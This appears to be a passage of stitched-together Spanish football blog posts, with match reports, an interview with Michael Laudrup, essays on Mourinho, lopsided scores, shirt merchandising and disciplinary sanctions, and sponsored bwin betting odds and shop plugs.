de llevárselos por delante.Lo mejor: Un puñado de buenos jugadores sobre los que debe sustentarse la planificación del próximo año y esa salvación lustrosa e in extremis que hace olvidar cualquier pena pasada.Lo peor: No parece un equipo saneado. Tras una buena temporada se han dormido y a punto ha estado de costarles un disgusto. Muy bien se tienen que hacer las cosas para que el año pasado no vuelva a ocurrir lo mismo. Los castigos nunca deben ser ejemplares.Sí hay que mencionar algunos que no tenemos problema en recomendar, y que aseguran éxito, por ejemplo, como regalos de Navidad. Ya reseñamos aquí “Frases de Fútbol“, de Miguel Gutiérrez, que nos hubiera entusiasmado igual si su miembro no fuera fundador de DDF. De otro de los puntales del fenómeno blog que “sobrevive” hasta hoy, Martí Perarnau, llegó “Senda de campeones”, un estupendo análisis de la cantera del Barça desarrollado por alguien que demuestra casi a diario su enciclopédico conocimiento del asunto. Orfeo Suárez, periodista de El Mundo, ha publicado hace pocas fechas “Palabra de entrenador”, sobre el a veces angustioso y siempre intenso mundo de los inquilinos del banquillo; Carlos Marañón contextualiza y agranda el mito de Evasión o Victoria en “Un partido de leyenda” y Petón le mete ritmo a la historia del balompié en “El fútbol tiene música”. Es sólo la punta del iceberg, y nos harían falta varios posts para reseñar todo lo que nos gustaría leer de entre lo publicado. Pero es muy de agradecer que haya aparecido esta vía por la que uno puede, todavía, hacerse prófugo del puntopelotismo. Ojalá siga abierta mucho tiempo. Pocas veces el tópico de dos partidos en uno ha cobrado más fuerza que esta noche en el Camp Nou. Cual un Henry Jekyll azulgrana, un Barcelona contemplativo y bondadoso ha comparecido sobre el césped de su coliseo, siendo atropellado por un Valencia enérgico, decidido y muy bien organizado. Éver y un gran Fernandes han portado el bastón de mando, Mathieu ha hecho sangre por la izquierda, no se han notado las ausencias –por decisión técnica- de Aduriz y Mata, y Pablo Hernández ha ejercido de avispa para marcar su tanto y casi sentenciar el partido con un trallazo al muñeco que ha despejado Víctor. Herido en su orgullo, el cuadro local se ha enfundado tras el descanso el traje de Mr. Hyde, una arrolladora voluntad de ganar que hubiera pasado por encima de quien hubiera estado delante. Iniesta, líder en la segunda mitad, ha igualado a los dos minutos, y el Barça ha percutido sin descanso hasta que Puyol ha desequilibrado en un testarazo portador de muy buenos recuerdos. Ahí ha muerto el partido, y apenas poco más puede reseñarse que cierta tensión final, el desacierto de un obcecado Villa y uno de los peores partidos jamás jugados por Leo Messi. Sólo queda la duda de si el Barça se tomó el partido con cierto relax, o el Valencia lo obligó a una inferioridad pocas veces vista en los últimos años. Ambas alternativas son preocupantes. Nuestro compañero Martín planteaba el otro día en Café Fútbol un interesante debate a partir de la inusitada goleada 10-0 del PSV al Feyenoord. Como sus preguntas son seguramente más interesantes que mis respuestas, planteamos esta entrada a modo de cuestionario. -¿Debe un equipo ir siempre a por un gol más, debe “abusar” del contrario si ve que es posible? ¿Es lo justo, lo ético con el espectador que pagó su entrada y con quien te paga el dinero? ¿O una vez cumplido el deber, que seria lograr la victoria, el exceso se convierte el algo casi inmoral?Sin ninguna duda, la obligación del profesional es ofrecer el máximo rendimiento durante los noventa minutos de partido, y el objetivo final del fútbol es meter goles. La goleada, en caso de producirse, es una circunstancia más del juego, producto de una diferencia en el desempeño de los dos equipos. Nada más y nada menos. La simple goleada, por tanto, no será por sí misma síntoma de abuso, sino indicador de dicha diferencia. Es a la vez ético con el espectador, cuyo nivel de expectación y disfrute sube con cada gol, consigo mismo y con el rival. Muchos futbolistas dicen que no pueden prometer resultados, sólo trabajo, y eso es lo que debe reclamarse. Del minuto uno al descuento, con la misma intensidad. Si las cosas salen tan bien que hay goleada, recompensa extra. Y si salen mal y caes goleado, al menos hiciste lo que pudiste. No hay ningún deshonor en ello. -¿Puede sentirse “agredido” el equipo que esta siendo humillado? Muchas veces vemos que los jugadores derrotados piden a los otros que levanten el pie, o se enfadan por lo que ellos ven como “excesiva” entrega del contrario. ¿Es razonable su malestar?Es absolutamente humano, y todos los que hemos jugado lo sabemos, el sentimiento de tristeza, impotencia, bronca y cabreo que se adueña de cualquier futbolista cuando ve que los chicharros van cayendo en su portería y que no hay modo de frenar a un rival crecido como un huracán. Sin embargo, de ahí a sentirse agredido hay distancia: no puede hablarse de agresión cuando el contrario sólo está cumpliendo con su obligación como deportista. Es razonable el malestar en cuanto a ser vapuleados, pero seguramente no hay nada más humillante que el hecho de que el contrario levante el pie y no lo dé todo, como un padre con su niño de cinco años. No hay peor asunción de inferioridad. – ¿Por que este tipo de resultados tan abultados se daban mucho mas hace décadas que ahora? Seguramente las defensas son mucho mas cerradas, el juego mucho más táctico, ¿pero no habrá también un componente de evitar un excesivo castigo al rival, evitar que se creen rencores? Total, pronto se tendrán que ver de nuevo…En este caso creo que no hay que rizar demasiado el rizo. Por simple lógica, es infinitamente más sencillo hacerle goles con cinco delanteros a una defensa de dos o tres que con dos delanteros a una zaga de cinco, máxime cuando en la actualidad todos o casi todos los jugadores se implican en la fase defensiva, se difunden las estrategias a través de internet, y hasta el más modesto combinado amateur trabaja la táctica. Por otra parte, el resto de las motivaciones que se esgrimen en la pregunta para evitar un excesivo castigo, etc., son igual de válidas ahora que en los años 50. Y queda el último factor, como espectadores, ¿os gusta ver este tipo de resultados, disfrutáis con la lluvia de goles, o por el contrario os ponéis en el papel del derrotado, y creéis que es algo hasta de “mal gusto?Aquí entramos en el terreno del gusto personal. Yo disfruto muchísimo viendo goles, sea de la signatura que sean y a favor del equipo que sean, es la máxima realización de la emoción futbolística y, además, es un bien muy preciado que se disfruta contadas veces en cada partido. En el caso de que sea mi equipo el que está siendo goleado, lo que deseo es que reaccione y presente batalla, no que el contrario les perdone la vida. Eso es lo que realmente parece de mal gusto.Además, me gustaría realizar un par de comentarios más. Por una parte, una goleada puede llegar a ser incluso beneficiosa para el equipo que la recibe (no digamos para el que la realiza, claro). Pero el perdedor puede darse cuenta de modo traumático de cuál es la diferencia que lo separa de su rival, y de hasta qué punto ha tocado fondo; factores ambos necesarios para comenzar cualquier reconstrucción.Y por otro lado, y enlazando con el tema del PSV-Feyenoord con el que comenzábamos, una paliza de tal calibre a un conjunto con nombre -en este caso, incluso campeón de Europa- y en un partido de rivalidad inmortaliza a todos los que participan en ella, y muy especialmente a los vencedores. ¿Qué mayor motivación cabe para darlo todo?Para concluir, nos gustaría recordar un video de un famoso Leeds-Southampton -extraído de las catacumbas de internet gracias a Sergio Cortina– que nos habla muy bien de lo que es realmente la humillación. No es el 7-0 que campea en el marcador al final del partido, sino la actitud del conjunto de Revie riéndose de su rival, no buscando más goles, sino dedicándose a conservar el balón con cañitos y virguerías en el centro del campo. Eso sí que resulta doloroso y, dicho sea de paso, también retrata al que lo hace. Un video que resulta duro de ver, pero que ilustra bien el tema del que hemos hablado.La medida de los tres aspirantes al título de Liga 2013/14 (ya solo dos desde la tarde del domingo) no es la que hemos podido constatar en estas dos últimas semanas. Los méritos acumulados por los tres equipos a lo largo del campeonato los sitúan en las tres primeras posiciones de la tabla y la liga no miente, por mucho que en este tramo final se esté convirtiendo en una especie de ‘torneo de la irregularidad‘: la terminará levantando, de aquí en siete días, el equipo menos irregular.La incontrolable sucesión de acontecimientos de estas últimas semanas han acabado deparándonos una resolución del campeonato acrobática, ayudada por un calendario caprichoso que quiso, cosas del destino, dibujar un Barcelona-Atlético en la última jornada, a modo de último y emocionante capítulo. Llega un punto, sin embargo, en el que termina valiendo más el camino que el objetivo. En el que el cortejo arrebata todo protagonismo a la cópula final, sobre todo si a ésta se llega de una manera tan angustiosa y, por qué no decirlo, indigna e impropia.Barça y Atletico, Atlético y Barça, pudieron haberse dejado por el camino el uno al otro varias semanas atrás. Se empeñaron, no obstante, en prolongar la agonía del rival. En validar, semana tras semana, todos y cada uno de los tropiezos que iban protagonizando tanto unos como otros. Como si estuvieran apiadándose mutuamente y se empeñaran en darse vida el uno al otro ante la amenaza de males mayores. Noventa minutos y un único escenario terminarán decidiendo un título de Liga que ha ido pasando de mano en mano en un torneo que ha sido imposible de pronosticar y en el que los favoritos parecieron querer dejar de serlo en el preciso momento en el que se reclamaba su presencia. Un buen día, Paco Jémez llegó al Campo de Fútbol de Vallecas y se encontró con alguien que no esperaba. Saltándose todas las reglas no escritas que rigen el funcionamiento de un club de fútbol, el principal patrocinador del Rayo Vallecano, la empresa china del sector tecnológico Qbao.com, habría impuesto a la entidad vallecana la incorporación de su compatriota Zhang Chengdong, un teórico carrilero diestro que parecía surgido de la nada y que disparó la indignación del que estaba llamado a ser su técnico durante la temporada 2015/16. Paco no contaba con Zhang. Probablemente, ni tan siquiera sabía quién era hasta que el secretario técnico vallecano, Felipe Miñambres, le habló sobre su incoporación. Llegó, se lo presentaron y le dijeron que era un nuevo miembro de su plantilla en virtud del acuerdo comercial suscrito con la empresa asiática. Y eso, tratándose de Paco, era jugársela a ciegas. ‘Me molesta que un patrocinador pueda tener capacidad de decisión dentro del área deportiva. Ha sido una imposición, pero yo pondré a quien me dé la gana. ‘. Jémez fue contundente sobre el asunto de la llegada del futbolista chino al Rayo. No dudó en hacer uso de la autoridad que se le presupone a un técnico para dejar claro que se posicionaba claramente en contra de cualquier tipo de intromisión en la parcela técnica, máxime si esta venía en forma de  un jugador impuesto al club por simples razones comerciales y no deportivas. Y lo hizo con esa vehemencia tan del gusto de la prensa con la que acostumbra a expresarse. El cabreo del técnico colocaba a la Franja en una delicada tesitura de cara al inminente arranque de la temporada. Y en mitad del desagradable, aunque no carente de fundamento, fuego cruzado entre Paco y Martín Presa, el futbolista. Un jugador del que pueden no tenerse excesivas referencias, pero del que si uno se esfuerza un mínimo en rebuscar en su hoja de servicios podrá comprobar que no es ningún cojo. Procedente del Beijing Guoan, entre los años 2009 y 2013 acumuló experiencia en diversos equipos portugueses y alemanes de segunda fila y ha sido internacional absoluto con China en dieciocho ocasiones (debutando, precisamente, de la mano de José Antonio Camacho). Siendo en cierto modo comprensible el cabreo de Jémez, su principal labor ahora debería de centrarse en tranquilizar los ánimos y asimilar lo mejor posible la incorporación del carrilero asiático y extraer el mayor rendimiento de un fichaje que, impuesto o no, solo debería haber aterrizado en Vallecas para sumar, nunca para restar. Dicen por ahí las malas lenguas que contrataciones como la de James Rodríguez por parte del Real Madrid no tienen un fundamento estrictamente deportivo.¿Qué pensáis vosotros? Llega el primer Real Madrid-Barcelona del año (La Sexta, 22:00) en medio de una calma chicha que pocos hubieran podido suponer después de las tempestades vividas en tiempos recientes: basta recordar que la últimas imágenes de un choque –nunca mejor dicho- entre ambos equipos remiten a una banda de macarras citándose con otra y a un dedo en un ojo. Sin embargo, es difícil recordar un Clásico reciente en la que la tensión previa sea tan baja. Guardiola aportó en la rueda de prensa su habitual dosis de prudencia y cortesía, mientras que Mourinho directamente decidió no acudir a ella, infestando el aire de lamentos y exabruptos postizos de la jauría diletante que vive de sacarle punta hasta a su último parpadeo. Un ruido menor y artificial que, por primera vez en bastante tiempo, ha dejado espacio para hablar de fútbol.Sin embargo, por debajo de la pátina de bonanza se esconde un evento que puede ser trascendental en el devenir del fútbol español. Cuando Mourinho llega a la Liga hace quince meses, es consciente de que su labor va más allá del puro trabajo de entrenar y ganar partidos o títulos. Toma el mando de un club sumido en una alarmante indefinición ideológica, inseguro y acomplejado ante un estupendo rival que ha asumido una triple supremacía: gana más que nadie, juega mejor que nadie, y además cae mejor que nadie. Mientras que los dos primeros fenómenos proceden de la intachable labor de Pep como entrenador y de la excelencia de muchos de sus futbolistas, el tercero proviene de un conglomerado donde se mezclan la excelencia deportiva, el impecable discurso del noi de Santpedor, el papel de los bajitos, los éxitos de la selección, la camiseta de Unicef o la apelación a la cantera como fuente de poder. Convenientemente agitado y exacerbado en ocasiones hasta límites ridículos, este relato se difunde durante años desde un doble altavoz: los medios afines al barcelonismo, por un lado, y un grupo de líderes de opinión tan próximos a Guardiola en lo personal como a Cruyff y Menotti en sus planteamientos futbolísticos. El Barça no sólo es el mejor equipo del mundo, sino que además es éticamente intachable. Y ese discurso cuaja, en parte porque se soporta en un éxito atronador.Mourinho comprende pronto que si desea arrojar al Barça de su pedestal tiene que batirse en las trincheras para combatir su supremacía en los tres terrenos, unos terrenos cuyas fronteras no están siempre bien delimitadas. Sus recursos son inferiores en los tres aspectos a los de su rival: sus futbolistas no son tan buenos, las cualidades de estos no se relacionan especialmente con el fútbol de toque, y desde el principio genera recelos tanto en el periodismo de Barcelona, que lo identifica con un ogro, como entre los líderes de opinión antes mencionados,  que por un lado lo describen como un entrenador defensivo y calculador, y por otro como un personaje siniestro, proclive al insulto y a la gresca, y muy lejos de los paradigmas de la intelectualidad. Además, parte de su propio entorno lo torpedea desde dentro, y deberá gestionar a una masa social siempre exigente, descolocada por los bandazos del banquillo y el páramo tanto ideológico como deportivo en el que hace tiempo que se encuentra su equipo. En principio, el objetivo de Mou parece poco menos que imposible.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Sin embargo, el portugués también dispone de armas poderosas, que muy pronto aprenderá a manejar, y que serán fundamentales en su trayecto. Por un lado, dispone de un puñado de sensacionales futbolistas, que si bien no llevan el tiki-taka por bandera, cobijan el germen potencial de un gran equipo. Después, cuenta con un apoyo presidencial del que no gozó ninguno de sus predecesores, en parte por tratarse de una especie de último recurso y en parte por el poderoso crédito ganado en su exitosa carrera; la fe de Florentino le servirá para eliminar enemigos dentro del propio club, y alcanzar cuotas inéditas de poder real en él. Y finalmente, la eliminatoria de Champions de su Inter frente al Barcelona le ha brindado simpatías suficientes entre la parroquia blanca para ser recibido en Concha Espina con los brazos abiertos.Con estos pertrechos y las limitaciones arriba mencionadas, Mourinho inicia su cruzada para cambiar el statu quo, utilizando una estrategia mixta, interna y externa. La interna pasa por convertirse en mánager general al estilo inglés, fichar buenos jugadores preferentemente jóvenes y convertir a su equipo en un mecano versàtil, que maneje tanto los registros del dominio como los del contragolpe, arrollador ante los inferiores y competitivo ante los grandes. Nada que no hubiera realizado en sus anteriores equipos. El camino es duro, en el campo del Barça le cae un 5-0, y durante todo el año debe soportar críticas feroces y duras comparaciones, tanto sinceras como interesadas. Sin embargo, a día de hoy pocos observadores niegan la excelsa calidad del juego que ha desarrollado el Madrid esta temporada, y que como equipo de fútbol resulta una maquinaria temible. La supremacía en el juego ya no está tan clara.Si la estrategia interna de Mourinho se focaliza en maximizar los recursos del Madrid, la externa se propone tirar abajo todo el relato construido estos años en torno al Barcelona, y que no tiene relación con su gran excelencia, la futbolística. Seguramente el hombre es consciente desde el principio de las toneladas de fango que se le vienen encima, a él y de rebote al club, pero las asume porque considera que la prioridad en ese momento no es preservar la imagen del Madrid, que en ese momento tiene poca relevancia, sino destruir la de un Barça alrededor del cual se ha impuesto una especie de pensamiento único. Con el apoyo del presidente a un lado y de la mayoría del madridismo al otro, desencadena una tormenta de ataques que tratan de incidir siempre en los supuestos puntos débiles del guardiolismo: el Barcelona es el equipo querido por las instituciones, la actitud de Pep no es real sino una pose, el Barça está protegido por el periodismo, tiene jugadores tan sucios como cualquiera, etc. Mourinho va cayendo cada vez más bajo, pero eso le importa poco, él desea otra cosa. Son muchas insinuaciones realizadas por una persona inteligente, y los efectos se acaban notando: toda Europa es testigo de un Guardiola fuera de sí en la sala de prensa, incompatible con su imagen habitual, o de los jugadores del Barça tirándose y fingiendo, en una imagen que es incluso portada en Estados Unidos. Mourinho ha resquebrajado, a costa de sí mismo, la aureola de perfección del Barcelona.Cuando el luso juzga que la labor de zapa es suficiente, decide volver a cuarteles de invierno, que es la tàctica de esta temporada. Con el madridismo firme tras él y la batalla ideológica consumada, bajan los decibelios  para rehabilitar la imagen del club y la suya propia, y llega el momento de batallar en el campo en busca de la tercera supremacía, la de los títulos. Una derrota, especialmente si es dolorosa, constituiría una grave regresión para el Madrid, pero una victoria le pondría un título mayor al alcance de la mano, dejaría muchas jornadas a los blancos por delante –imagen, siempre imagen- y sobre todo, supondría a Mourinho una confirmación mayúscula de que su estrategia ha sido correcta. Por más discutible éticamente que haya sido, o más que discutible. La inversión del statu quo.Un partido tan igualado tiene por fuerza que generar apuestas muy interesantes. En bwin.com se paga mejor la victoria del Barcelona (2.70) que la del Madrid (2.50), un hecho que ha generado cierta polvareda; sin embargo, quizá lo más provechoso sea pensar en un empate, que se paga a 3.50 y fue el resultado más común de los últimos clásicos. Cinco o más goles rentan 5.25, y no es nada descabellado que el partido salga abierto. Se dan 4 euros porque marque Fàbregas, un ciclón delante de la portería, y 3.75 por Di María, en tremenda forma. Que abra el marcador Messi, algo más o menos habitual, se paga a 4.50, lo mismo que si lo hace Cristiano.Y un triplete de cualquiera de los dos, 15 euros. Para pensárselo. 15 de Noviembre de 2009. En el vetusto Luzhniki de Moscú se apiñan más de 80.000 enfervorizados hinchas dispuestos a llevar a su selección a un nuevo gran torneo; un equipo que viene de ser semifinalista de la Eurocopa tras una inolvidable prórroga frente a Holanda, que alista en sus filas a uno de los mejores futbolistas del planeta, Arshavin, y  al que secundan nombres como Pavlyuchenko, Zhirkov o Zyrianov, gente que no son cualquier cosa en el panorama internacional. Eslovenia parece ejercer de convidado de piedra, y a pesar de manejarse con orden y empaque, soporta mal las embestidas rusas, comandadas por un Bilyaletdinov que tiene el día y que ya ha clavado dos chicharros que parecen sellar el destino de la repesca. Es el 2-0 siempre deseado en una ida, y apenas quedan tres minutos…… cuando el mediocentro esloveno Robert Koren avanza por la izquierda, y justo al pisar el vértice del área grande percibe un hueco y lanza un disparo que se dirige como una centella al palo opuesto. El arquero Akinfeev se lanza como un gamo y consigue rechazar el balón con los brazos extendidos, pero su despeje es blando y débil y cae como agua de mayo sobre la abundante de melena de Nejc Pecnik, que sólo debe darle un ligero impulso a la bola para introducirla en la portería. Es la apoteosis del superviviente, del equipo pequeño que se lanzó a por todas sin nada que perder, y encontró el premio merecido. Luego en casa fue todo un poco más fácil -sólo un poco-, y el solitario gol de Dedic en Maribor logró lo que nadie creía posible.Quizá tenga más nombre que otras selecciones porque estamos familiarizados con Zahovic, que jugó en el Valencia, con Acimovic y quizá con el antiguo preparador Katanec, pero lo cierto es que con Eslovenia quizá estamos hablando de la más débil de todas las selecciones europeas que acuden a Sudáfrica. Un país de escasos dos millones de habitantes, cuyo club más conocido es un Maribor Branik que apenas ha sacado la cabeza en competición europea, que tiene a todos sus jugadores –con la excepción de Khrin– como prácticos figurantes en clubes de segunda fila, y que en el único mundial que ha disputado no logró un mal punto.Se acomoda en el campo bailando entre el resto con la suficiencia del que se sabe el mejor del campeonato. Y así, aliñando con quiebros y bailes sus quince goles y quince pases de gol, se ha embolsado con 21 años el premio al mejor jugador del campeonato. Lo sabía el Tottenham, hasta los profanos se dan cuenta y en breve, el año que viene disputará Premier, lo sabrá toda Europa. La cervecera Heineken nos lo puso en bandeja y para el Teatro Calderón que nos fuimos. Michael Laudrup, participante de lujo en el evento Heineken Match Your Half Ticket, junto a José Francisco Molina y Rafael Martín Vázquez, atendió amablemente nuestras preguntas sobre su pasado, su futuro y su presente. Una charla que ojalá no hubiese terminado nunca.Ha pasado poco tiempo pero, ¿añoras ya los banquillos?No. Solo han pasado dos meses y pico. Ahora puedo hacer muchas otras cosas porque cuando estás entrenando, especialmente cuando eres entrenador, todo el tiempo menos cuando duermes, estás pensando en el fútbol. Es muy diferente a ser futbolista y cuando no tienes un equipo tienes tiempo para otras cosas. Para ir al estadio sin nervios, para ir ver la final de Copa en Valencia…Pero hay que esperar. Ahora estamos a final de temporada y vamos a ver lo que hay este verano pero no estoy obsesionado. Si hay un buen equipo sí y si no voy a esperar.Has entrenado en varios países ¿Cual es la diferencia entre hacerlo en Inglaterra o en España? ¿Qué has aprendido en el Swansea?Estuve en un club pequeño e hicimos la mejor temporada de su vida. El primer trofeo en cien años de historia, ganando la Copa y en su segundo año en primera quedando entre los diez primeros. Fue una cosa increíble para una ciudad pequeña y eso no lo olvidaré nunca. Conseguir algo con equipos pequeños es increíble.No quiero ser entrenador hasta los 65 años. ¿Por qué? Quiero disfrutar el otro lado del fútbol y no estar pensando toda la vida en el entrenamiento de mañana, en el de pasado, en los partidos, en veinticinco jugadores…A ti te destituyen habiendo firmado una temporada irrepetible ¿Queda algo del famoso romanticismo en el fútbol inglés?Bueno, a mí me destituyen por email. Que es muy bonito, ¿no?Lo que han hecho es algo que antes solo se había visto en otros países. Creo que influye mucho la presión por los contratos de televisión. El Swansea, por ejemplo, era un club acostumbrado en los últimos seis o siete años a ir hacia arriba. De Tercera a Segunda, a Primera, ganar una Copa, quedar entre los diez primeros… De repente tienes un año de sufrimiento, también por jugar en Europa League y entra un poco el pánico. Hasta el Fulham ha destituido a dos entrenadores en la misma temporada porque es mucho dinero el que se están jugando allí por los contratos televisivos y bajar es un desastre. Ha cambiado.El tema del Manchester United es un poco diferente. Era un equipo que era campeón y acaba séptimo. Y aunque ellos (por la directiva) ya sabían que esta era una campaña de transición mira lo que ha pasado. ¿Crees que existe un debate desmesurado en torno al estilo de fútbol que deben desplegar los equipos hoy en día? ? ¿Cuando jugabas sucedía igual?Es complicado pero ¿cómo de rígido debe ser el estilo de un club? ¿No se puede cambiar nada? Sobre eso te cuento una anécdota. Pasé mi último año como jugador en el Ajax y allí siempre se ha jugado tradicionalmente con 4-3-3 y dos extremos. Aquel año teníamos cuatro extremos en la plantilla y los cuatro se nos lesionaron antes de un partido. Le llevábamos ocho puntos al segundo y jugamos aquel partido sin extremos, con un 4-4-2. Ganamos pero se armó un lío tremendo en los periódicos de Amsterdam por el cambio. El estilo era tan rígido… No estoy de acuerdo con eso, como entrenador tienes que utilizar los jugadores que tienes. ¿Puede haber sido ese uno de los problemas del Tata Martino en el Barcelona? ¿La falta de esa ligazón con las tradiciones del club?El Barcelona no ha cambiado el estilo. Todavía tocan muchísimo el balón. Lo único que veo es que el Tata no tiene un pasado, una historia en el Barcelona pero no sé hasta que punto influye. Rijkaard no la tenía y encajó bien allí. ¿Te ves entrenando al Barcelona?Como colega hay que tener un respeto y no puedo hablar de un trabajo donde hay un entrenador que está trabajando y encima está teniendo problemas. Es algo que espero que nunca me pase a mi. Les propongo un ejercicio. Tomen estas líneas como si fuesen uno de aquellos pequeños televisores de juguete que, al pegar el ojo a la mirilla, nos permitían perder la tarde con un puñado de estampas de esta o aquella capital patria. Cada punto y seguido, una foto.Bogotá. 2 de julio de 1981. La España de Santamaría girando sin rumbo por el cono sur camino del Mundial 82. Arconada. Camacho y Gordillo. Juanito. Zamora y Satrústegi. Enfrente Carlos Salvador Pisalo Bilardo y Pacho Maturana, el esteta. El primero en el banquillo y el segundo rascando el tobillo del delantero rival. Paradojas. Un gol y gracias.En su afán por ‘conquistar el planeta’, el plan de expansión mundial desarrollado por Florentino Pérez sigue la táctica del acercamiento y de la convicción a los extraños, nunca de la imposición invasiva. Por eso, ataca a los incrédulos y a los habitantes de las tierras por colonizar por la vía sentimental. La estrategia de globalización de la marca Real Madrid no lucha contra los incrédulos, les da motivos para que se conviertan y empiecen a creer. Algo inteligente y relativamente sencillo de gobernar cuando tu talonario nunca se termina, claro. Vender miles de camisetas de James, como en su momento pudo haber sido vender las de David Beckham o de Ricardo Kaká puede hacer, a ojos del máximo mandatario madridista, generosamente fructífera la operación de adquisición del pase del centrocampista colombiano. Ningún hincha colombiano sin su camiseta de James.La trascendencia del merchandising futbolístico se ha disparado en las dos últimas décadas. Piense el aficionado más joven, aquel que ha conocido prácticamente durante toda su vida las camisetas con el nombre del futbolista en cuestión impreso en el dorso, que comprar una camiseta de todo un Real Madrid allá a finales de la década de los ochenta era una absoluta odisea. El actual concepto de megastore se ceñía a una caseta prefabricada ubicada en la explanada que existía en lo que actualmente es el centro comercial de la calle Padre Damián. Cuatro camisetas, dos banderines y algún llavero suelto era todo el inventario a disposición del aficionado, que marchaba de allí no con lo que quería, sino con lo que podía encontrar. No es necesario explicar cuál era la situación en el resto de equipos de Primera división. Si complicado resultaba significarse como madridista, hacerlo como zaragocista, espanyolista (de aquella ‘españolista’) o malaguista era una pretensión imposible.Pero de pronto, ocurrió que el fútbol se modernizó de golpe. A mediados de la década de los noventa se instauró en nuestra liga la oficialidad de las camisetas con dorsal fijo y nombre del futbolista en el dorso, a imagen y semejanza de lo que ya se venía haciendo en la recién nacida Premier League desde unos pocos años antes. Los clubes empezaron a comprobar que en el aún virgen merchandising futbolístico había un filón por explotar. Enseguida llegaron los contratos estratosféricos con las marcas deportivas y las nuevas modalidades de venta mundial a través de Internet. Primero los grandes clubes y poco a poco el resto, todos entendieron la posibilidad de sacar tajada del recién descubierto pastel. Camisetas y más camisetas. Dos, tres y hasta cuatro por temporada, como en los buenos tiempos pre-crisis. Un diseño nuevo por cada campaña. Un pequeño detalle en el cuello o en una manga y lista para caer en las manos de los abnegados hinchas, incapaces de resistirse al caramelito. Y tanto partido se quiso sacar de la recién descubierta veta, que la tontería acabó disparándose. A día de hoy, pagar setenta euros en la tienda del club por una camiseta que en apenas medio año se habrá quedado obsoleta y cuyo coste de fabricación es diez veces inferior a su precio de venta es peccata minuta. Algunos hace tiempo que nos negamos en rotundo a ser cómplices de semejante abuso practicado, mano a mano, por los clubes y las marcas deportivas. No es ya por una cuestión de mera economía, es por pura dignidad. De los ochenta y cinco euros por camiseta en las tiendas oficiales de Real Madrid, FC Barcelona y Athletic Club (en caso de llevar serigrafía se disparan por encima de los ¡cien euros!) a los cincuenta de la del Villarreal CF, la más barata de Primera división. Entre el diez y el trece por ciento del salario mínimo interprofesional en España por una camiseta de fútbol. De locos. Otra burbuja más pendiente de reventar.Afortunadamente, para todos aquellos coleccionistas que decidimos dar la espalda al sistema y que aún así somos partidarios del producto cien por cien oficial, existen opciones como Classic Shirts. Como ellos mismos dicen ¿por qué llevar la última camiseta, la que lleva todo el mundo, y no distinguirse con aquella inolvidable elástica que hizo a tu equipo campeón allá por el año 95? Trencilla, juez, colegiado, referí, … El hombre de negro. De entre todas las múltiples maneras de referirse a un árbitro pocas hay tan sonoras, justificadas y representativas como la que lo identifica con el particular color de su uniforme. El negro es el color de lo que no se quiere ver. Un color infausto, asociado casi siempre a la tristeza, a las trabas, a la ausencia de esperanza… No parecía haber un color más apropiado para la tribu arbitral. O así, era, hasta que en la temporada 1992/93, y coincidiendo con el arranque de la Premier League, la Football Association inglesa, siempre un pasito por delante en lo que a la mercadotecnia e imagen se refiere, tomó la inolvidable decisión de introducir nuevos pasos dentro de la gama cromática en los uniformes oficiales de sus colegiados. Porque el negro es también el color de la elegancia y de la sobriedad. Y estiliza, vaya si estiliza.Así, y coincidiendo con la primera temporada de la nueva competición inglesa, los árbitros dejaron de ser necesariamente ‘el de negro’. Empezaron a aparecer por los campos ingleses manchas grises, amarillas, rojas, blancas, doradas, azules o incluso rosas, todas ellas en feliz convivencia con el tradicional negro, para conseguir una total diferenciación con las equipaciones de los clubes contendientes. Era un paso más en la modernización del fútbol. Imagino que hoy en día nos habríamos llevado las manos en la cabeza y habríamos puesto el grito en el cielo, presos de la más incontenible y posturera indignación… maldito fútbol moderno.Lo que la FA no sabía era que con su histórica decisión acababa de abrir un nuevo horizonte a los diseñadores de las marcas deportivas que equipaban a los grandes clubes del país: el color negro. Tras el levantamiento del veto enseguida empezaron a aparecer, en aquella misma temporada 1992/93, equipaciones con el tradicional color arbitral como base. Pionero, como en tantas otras cosas, fue el Manchester United. Los red devils, aún de la mano de Umbro, conquistaron el ojito (y la cartera) de sus aficionados con una recordada camiseta negra con ribetes amarillos y azules. Fue una camiseta inolvidable por un doble motivo. Además de tratarse de la primera equipación negra de la historia del club fue la camiseta con la que Eric Cantona decidió exhibir sus dotes para el kung-fu en la banda de Selhurst Park.Pero no fue el United el único club que decidió aprovechar la oportunidad de vestirse de negro. La nueva moda pronto se extendió entre la gran mayoría de los clubes ingleses. Quien más quien menos, todos los principales equipos han contado con alguna equipación en color negro desde aquella temporada 1992/93. Aston Villa, Blackburn Rovers, Newcastle, Southampton, Chelsea,… de pronto el negro se convirtió en un socorrido recurso para los diseñadores. La corriente tardó poco en saltar al continente (el tiempo justo para que UEFA y FIFA adoptaran idéntica medida que su afiliada inglesa con respecto al uniforme arbitral). Fue entonces el turno del Real Madrid, del Milan, del Borussia Dortmund o de la Juventus, por traer algunos de los más recordados diseños.Desde entonces, desde que en 1992 el Manchester United y Umbro decidiesen poner fin a tantos años de tabú y de terrenos prohibidos, pocos clubes han resistido a la implacable moda del negro en sus equipaciones.En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, tienes un completísimo muestrario de camisetas en color negro. Desde lo más clásico hasta lo más vanguardista. Ese icono pop de la modernidad que es el Real Madrid vivió ayer uno de esos episodios que, para mayor gloria de Florentino Pérez, jalonan esa leyenda de club de fútbol con descaradas inclinaciones empresariales que parece inherente al madridismo contemporáneo.La pena de una persona no debe aumentar para llamar la atención sobre un caso concreto, para paliar una amenaza social o para moralizar al resto de la población. Cada hecho tiene su justa sanción, equilibrada, motivada y proporcional al daño inflingido. Ni la caprichosa repercusión mediática, ni las conmovedoras imágenes de lo sucedido, ni la popularidad de la víctima deben cambiar un ápice el montante del castigo. El derecho a punir un determinado hecho es ya un incentivo suficiente para que el resto del mundo se piense dos veces cometer un acto tipificado, en la vida y en el fútbol.Hablo de la entrada de Ujfalusi. Se pide para el checo un castigo ejemplar. Una sanción que sirva como modelo para posteriores jugadores. Muchos partidos en el dique seco para decirle al colchonero y al resto de la humanidad lo peligroso y nocivo que es jugar al límite del reglamento. Aplicar el artículo 97 en lugar del 115 del Código Disciplinario, y hacerlo en su medida superior, más cerca de los doce partidos que de los cuatro. Se pide desde algunos medios de comunicación -desde esa tribuna ruidosa, desde esos pupitres escolares- que se castigue duramente a Ujfalusi y que sirva como modelo de protección de los futbolistas “especiales”. Como si tocar el tobillo de Messi fuera más grave que tocar el tobillo de cualquier otro, como si existieran matices en las tarjetas en función de los jugadores 